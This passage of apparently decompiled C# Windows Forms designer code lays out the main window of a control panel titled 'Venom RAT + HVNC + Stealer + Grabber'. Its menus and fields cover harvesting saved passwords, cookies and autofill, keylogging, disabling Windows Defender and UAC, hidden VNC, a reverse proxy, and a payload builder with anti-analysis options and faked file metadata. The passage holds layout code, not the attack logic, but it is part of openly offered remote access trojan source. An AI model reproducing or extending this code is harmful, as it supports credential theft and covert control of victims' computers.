		this.txtProduct.Properties.Appearance.Font = new System.Drawing.Font("Tahoma", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.txtProduct.Properties.Appearance.Options.UseFont = true;
		this.txtProduct.Size = new System.Drawing.Size(467, 28);
		this.txtProduct.TabIndex = 132;
		this.txtIcon.Enabled = false;
		this.txtIcon.Location = new System.Drawing.Point(21, 61);
		this.txtIcon.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.txtIcon.MenuManager = this.barManager1;
		this.txtIcon.Name = "txtIcon";
		this.txtIcon.Size = new System.Drawing.Size(591, 28);
		this.txtIcon.TabIndex = 131;
		this.txtCompany.Enabled = false;
		this.txtCompany.Location = new System.Drawing.Point(145, 301);
		this.txtCompany.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.txtCompany.MenuManager = this.barManager1;
		this.txtCompany.Name = "txtCompany";
		this.txtCompany.Properties.Appearance.Font = new System.Drawing.Font("Tahoma", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.txtCompany.Properties.Appearance.Options.UseFont = true;
		this.txtCompany.Size = new System.Drawing.Size(467, 28);
		this.txtCompany.TabIndex = 135;
		this.chkIcon.Location = new System.Drawing.Point(21, 35);
		this.chkIcon.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.chkIcon.Name = "chkIcon";
		this.chkIcon.Properties.Caption = "Icon";
		this.chkIcon.Size = new System.Drawing.Size(110, 22);
		this.chkIcon.TabIndex = 127;
		this.chkIcon.CheckedChanged += new System.EventHandler(ChkIcon_CheckedChanged);
		this.txtDescription.Enabled = false;
		this.txtDescription.Location = new System.Drawing.Point(145, 268);
		this.txtDescription.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.txtDescription.MenuManager = this.barManager1;
		this.txtDescription.Name = "txtDescription";
		this.txtDescription.Properties.Appearance.Font = new System.Drawing.Font("Tahoma", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.txtDescription.Properties.Appearance.Options.UseFont = true;
		this.txtDescription.Size = new System.Drawing.Size(467, 28);
		this.txtDescription.TabIndex = 136;
		this.label8.AutoSize = true;
		this.label8.Location = new System.Drawing.Point(19, 242);
		this.label8.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label8.Name = "label8";
		this.label8.Size = new System.Drawing.Size(48, 13);
		this.label8.TabIndex = 73;
		this.label8.Text = "Product:";
		this.btnAssembly.Location = new System.Drawing.Point(21, 189);
		this.btnAssembly.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.btnAssembly.Name = "btnAssembly";
		this.btnAssembly.Properties.Caption = "Assembly";
		this.btnAssembly.Size = new System.Drawing.Size(110, 22);
		this.btnAssembly.TabIndex = 130;
		this.btnAssembly.CheckedChanged += new System.EventHandler(BtnAssembly_CheckedChanged);
		this.label7.AutoSize = true;
		this.label7.Location = new System.Drawing.Point(18, 276);
		this.label7.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label7.Name = "label7";
		this.label7.Size = new System.Drawing.Size(64, 13);
		this.label7.TabIndex = 75;
		this.label7.Text = "Description:";
		this.label9.AutoSize = true;
		this.label9.Location = new System.Drawing.Point(18, 310);
		this.label9.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label9.Name = "label9";
		this.label9.Size = new System.Drawing.Size(56, 13);
		this.label9.TabIndex = 77;
		this.label9.Text = "Company:";
		this.btnIcon.Enabled = false;
		this.btnIcon.ImageOptions.ImageToTextAlignment = DevExpress.XtraEditors.ImageAlignToText.LeftCenter;
		this.btnIcon.ImageOptions.ImageToTextIndent = 0;
		this.btnIcon.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("btnIcon.ImageOptions.SvgImage");
		this.btnIcon.ImageOptions.SvgImageColorizationMode = DevExpress.Utils.SvgImageColorizationMode.Full;
		this.btnIcon.ImageOptions.SvgImageSize = new System.Drawing.Size(30, 30);
		this.btnIcon.Location = new System.Drawing.Point(21, 97);
		this.btnIcon.Name = "btnIcon";
		this.btnIcon.Size = new System.Drawing.Size(37, 28);
		this.btnIcon.TabIndex = 120;
		this.btnIcon.Click += new System.EventHandler(BtnIcon_Click);
		this.label10.AutoSize = true;
		this.label10.Location = new System.Drawing.Point(18, 344);
		this.label10.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label10.Name = "label10";
		this.label10.Size = new System.Drawing.Size(58, 13);
		this.label10.TabIndex = 78;
		this.label10.Text = "Copyright:";
		this.label11.AutoSize = true;
		this.label11.Location = new System.Drawing.Point(18, 378);
		this.label11.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label11.Name = "label11";
		this.label11.Size = new System.Drawing.Size(67, 13);
		this.label11.TabIndex = 79;
		this.label11.Text = "Trademarks:";
		this.label12.AutoSize = true;
		this.label12.Location = new System.Drawing.Point(18, 412);
		this.label12.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label12.Name = "label12";
		this.label12.Size = new System.Drawing.Size(92, 13);
		this.label12.TabIndex = 80;
		this.label12.Text = "Original Filename:";
		this.btnClone.Enabled = false;
		this.btnClone.ImageOptions.ImageToTextAlignment = DevExpress.XtraEditors.ImageAlignToText.LeftCenter;
		this.btnClone.ImageOptions.ImageToTextIndent = 10;
		this.btnClone.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("btnClone.ImageOptions.SvgImage");
		this.btnClone.ImageOptions.SvgImageColorizationMode = DevExpress.Utils.SvgImageColorizationMode.Full;
		this.btnClone.ImageOptions.SvgImageSize = new System.Drawing.Size(20, 20);
		this.btnClone.Location = new System.Drawing.Point(145, 193);
		this.btnClone.Name = "btnClone";
		this.btnClone.Size = new System.Drawing.Size(126, 28);
		this.btnClone.TabIndex = 117;
		this.btnClone.Text = "Clone";
		this.btnClone.Click += new System.EventHandler(btnClone_Click);
		this.label13.AutoSize = true;
		this.label13.Location = new System.Drawing.Point(18, 480);
		this.label13.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label13.Name = "label13";
		this.label13.Size = new System.Drawing.Size(65, 13);
		this.label13.TabIndex = 81;
		this.label13.Text = "File Version:";
		this.label14.AutoSize = true;
		this.label14.Location = new System.Drawing.Point(18, 446);
		this.label14.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label14.Name = "label14";
		this.label14.Size = new System.Drawing.Size(86, 13);
		this.label14.TabIndex = 82;
		this.label14.Text = "Product Version:";
		this.picIcon.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.picIcon.ErrorImage = null;
		this.picIcon.InitialImage = null;
		this.picIcon.Location = new System.Drawing.Point(509, 97);
		this.picIcon.Margin = new System.Windows.Forms.Padding(2);
		this.picIcon.Name = "picIcon";
		this.picIcon.Size = new System.Drawing.Size(103, 92);
		this.picIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.picIcon.TabIndex = 91;
		this.picIcon.TabStop = false;
		this.ConnectTimeout.Enabled = true;
		this.ConnectTimeout.Interval = 5000;
		this.ConnectTimeout.Tick += new System.EventHandler(ConnectTimeout_Tick);
		this.popupMenuClient.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[18]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.initallpluginmenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.barSubItem1),
			new DevExpress.XtraBars.LinkPersistInfo(this.barSubItem11),
			new DevExpress.XtraBars.LinkPersistInfo(this.barSubItem3),
			new DevExpress.XtraBars.LinkPersistInfo(this.barSubItem5),
			new DevExpress.XtraBars.LinkPersistInfo(this.barSubItem6),
			new DevExpress.XtraBars.LinkPersistInfo(this.barSubItem7),
			new DevExpress.XtraBars.LinkPersistInfo(this.barSubItem2),
			new DevExpress.XtraBars.LinkPersistInfo(this.barSubItem8),
			new DevExpress.XtraBars.LinkPersistInfo(this.OpenHvncMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.barSubItem9),
			new DevExpress.XtraBars.LinkPersistInfo(this.GotoSettingMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.barSubItem12),
			new DevExpress.XtraBars.LinkPersistInfo(this.ReverseProxyMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.AddNoteMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.FunMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.SelectAllMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.ClientFolderMenu)
		});
		this.popupMenuClient.Manager = this.barManager1;
		this.popupMenuClient.Name = "popupMenuClient";
		this.popupMenuRecovery.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[7]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.SaveAllPassword),
			new DevExpress.XtraBars.LinkPersistInfo(this.SaveAllCookies),
			new DevExpress.XtraBars.LinkPersistInfo(this.SaveAllHistory),
			new DevExpress.XtraBars.LinkPersistInfo(this.SaveAllAutoFill),
			new DevExpress.XtraBars.LinkPersistInfo(this.SaveAllBookmarks),
			new DevExpress.XtraBars.LinkPersistInfo(this.CopyIpMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.RefreshRecoveryMenu)
		});
		this.popupMenuRecovery.Manager = this.barManager1;
		this.popupMenuRecovery.Name = "popupMenuRecovery";
		this.popupMenuTask.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[12]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.TaskInstallSchTaskMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.TaskLoadRecoveryDataMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.TaskLoadStealDataMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.TaskSendFileToMemoryMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.TaskAutoKeyloggerMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.TaskTimerKeylogMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.TaskSendFileTODiskMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.Task_SendFileFromUrl),
			new DevExpress.XtraBars.LinkPersistInfo(this.TaskDisableWDMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.TaskDisableUACMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.TaskUpdateAllMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.TaskDeleteMenu)
		});
		this.popupMenuTask.Manager = this.barManager1;
		this.popupMenuTask.Name = "popupMenuTask";
		this.popupMenuScreen.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[2]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.StartScreenMenu),
			new DevExpress.XtraBars.LinkPersistInfo(this.StopScreenMenu)
		});
		this.popupMenuScreen.Manager = this.barManager1;
		this.popupMenuScreen.Name = "popupMenuScreen";
		this.popupMenuLog.LinksPersistInfo.AddRange(new DevExpress.XtraBars.LinkPersistInfo[1]
		{
			new DevExpress.XtraBars.LinkPersistInfo(this.ClearLogMenu)
		});
		this.popupMenuLog.Manager = this.barManager1;
		this.popupMenuLog.Name = "popupMenuLog";
		this.panelControl1.Appearance.BackColor = System.Drawing.Color.FromArgb(32, 32, 32);
		this.panelControl1.Appearance.BorderColor = System.Drawing.Color.FromArgb(1, 163, 1);
		this.panelControl1.Appearance.Options.UseBackColor = true;
		this.panelControl1.Appearance.Options.UseBorderColor = true;
		this.panelControl1.BorderStyle = DevExpress.XtraEditors.Controls.BorderStyles.NoBorder;
		this.panelControl1.Controls.Add(this.toolStripLabel1);
		this.panelControl1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.panelControl1.Location = new System.Drawing.Point(0, 655);
		this.panelControl1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.panelControl1.Name = "panelControl1";
		this.panelControl1.Size = new System.Drawing.Size(1432, 28);
		this.panelControl1.TabIndex = 17;
		this.toolStripLabel1.Appearance.ForeColor = System.Drawing.Color.Gainsboro;
		this.toolStripLabel1.Appearance.Options.UseForeColor = true;
		this.toolStripLabel1.Location = new System.Drawing.Point(5, 7);
		this.toolStripLabel1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.toolStripLabel1.Name = "toolStripLabel1";
		this.toolStripLabel1.Size = new System.Drawing.Size(59, 13);
		this.toolStripLabel1.TabIndex = 11;
		this.toolStripLabel1.Text = "Client Count";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(1432, 683);
		base.Controls.Add(this.xtraTabControl1);
		base.Controls.Add(this.panelControl1);
		base.Controls.Add(this.barDockControlLeft);
		base.Controls.Add(this.barDockControlRight);
		base.Controls.Add(this.barDockControlBottom);
		base.Controls.Add(this.barDockControlTop);
		base.IconOptions.Icon = (System.Drawing.Icon)resources.GetObject("FormMain.IconOptions.Icon");
		base.IconOptions.Image = (System.Drawing.Image)resources.GetObject("FormMain.IconOptions.Image");
		base.Margin = new System.Windows.Forms.Padding(2);
		this.MinimumSize = new System.Drawing.Size(1434, 717);
		base.Name = "FormMain";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Venom RAT + HVNC + Stealer + Grabber";
		base.Activated += new System.EventHandler(Form1_Activated);
		base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(Form1_FormClosed);
		base.Load += new System.EventHandler(Form1_Load);
		((System.ComponentModel.ISupportInitialize)this.performanceCounter1).EndInit();
		((System.ComponentModel.ISupportInitialize)this.performanceCounter2).EndInit();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl1).EndInit();
		this.xtraTabControl1.ResumeLayout(false);
		this.xtraTabPage1.ResumeLayout(false);
		this.splitContainer4.Panel1.ResumeLayout(false);
		this.splitContainer4.Panel2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.splitContainer4).EndInit();
		this.splitContainer4.ResumeLayout(false);
		this.panel3.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.textEditSearch.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.barManager1).EndInit();
		((System.ComponentModel.ISupportInitialize)this.gridControlClient).EndInit();
		((System.ComponentModel.ISupportInitialize)this.gridViewClient).EndInit();
		this.xtraTabPage12.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.gridControlLog).EndInit();
		((System.ComponentModel.ISupportInitialize)this.gridViewLog).EndInit();
		this.xtraTabPage2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.panelControl2).EndInit();
		this.panelControl2.ResumeLayout(false);
		this.xtraTabPage3.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.gridControlTask).EndInit();
		((System.ComponentModel.ISupportInitialize)this.gridViewTask).EndInit();
		this.xtraTabPage4.ResumeLayout(false);
		this.tableLayoutPanel1.ResumeLayout(false);
		this.panel2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.listViewRecoveryClients).EndInit();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl2).EndInit();
		this.xtraTabControl2.ResumeLayout(false);
		this.xtraTabPage7.ResumeLayout(false);
		this.splitContainer3.Panel1.ResumeLayout(false);
		this.splitContainer3.Panel2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.splitContainer3).EndInit();
		this.splitContainer3.ResumeLayout(false);
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.txtPasswordSearch.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.chkAll.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.gridControlRecoveryPassword).EndInit();
		((System.ComponentModel.ISupportInitialize)this.gridViewRecoveryPassword).EndInit();
		this.xtraTabPage8.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.gridControlCookie).EndInit();
		((System.ComponentModel.ISupportInitialize)this.gridViewCookie).EndInit();
		this.xtraTabPage9.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.gridControlHistory).EndInit();
		((System.ComponentModel.ISupportInitialize)this.gridViewHistory).EndInit();
		this.xtraTabPage10.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.gridControlBookmarks).EndInit();
		((System.ComponentModel.ISupportInitialize)this.gridViewBookmarks).EndInit();
		this.xtraTabPage11.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.gridControlAutofill).EndInit();
		((System.ComponentModel.ISupportInitialize)this.gridViewAutofill).EndInit();
		this.xtraTabPage5.ResumeLayout(false);
		this.splitContainer2.Panel1.ResumeLayout(false);
		this.splitContainer2.Panel2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.splitContainer2).EndInit();
		this.splitContainer2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.listViewGrabClients).EndInit();
		((System.ComponentModel.ISupportInitialize)this.gridControlGraber).EndInit();
		((System.ComponentModel.ISupportInitialize)this.gridViewGraber).EndInit();
		this.xtraTabPage6.ResumeLayout(false);
		this.xtraScrollableControl1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl3).EndInit();
		this.xtraTabControl3.ResumeLayout(false);
		this.xtraTabPage13.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.groupControl1).EndInit();
		this.groupControl1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.listBoxIP).EndInit();
		((System.ComponentModel.ISupportInitialize)this.txtPaste_bin.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.chkPaste_bin.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.textIP.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.groupControl4).EndInit();
		this.groupControl4.ResumeLayout(false);
		this.groupControl4.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.comboBoxFolder.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numDelay.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.txtMutex.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.txtGroup.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.textFilename.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.chkAntiProcess.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.chkAnti.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.chkBsod.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.checkBox1.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.radioGroupArchitecture.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.groupControl2).EndInit();
		this.groupControl2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.listBoxPort).EndInit();
		((System.ComponentModel.ISupportInitialize)this.textPort.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.groupControl3).EndInit();
		this.groupControl3.ResumeLayout(false);
		this.groupControl3.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.txtFileVersion.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.txtProductVersion.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.txtOriginalFilename.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.txtTrademarks.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.txtCopyright.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.txtProduct.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.txtIcon.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.txtCompany.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.chkIcon.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.txtDescription.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.btnAssembly.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.picIcon).EndInit();
		((System.ComponentModel.ISupportInitialize)this.popupMenuClient).EndInit();
		((System.ComponentModel.ISupportInitialize)this.popupMenuRecovery).EndInit();
		((System.ComponentModel.ISupportInitialize)this.popupMenuTask).EndInit();
		((System.ComponentModel.ISupportInitialize)this.popupMenuScreen).EndInit();
		((System.ComponentModel.ISupportInitialize)this.popupMenuLog).EndInit();
		((System.ComponentModel.ISupportInitialize)this.panelControl1).EndInit();
		this.panelControl1.ResumeLayout(false);
		this.panelControl1.PerformLayout();
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
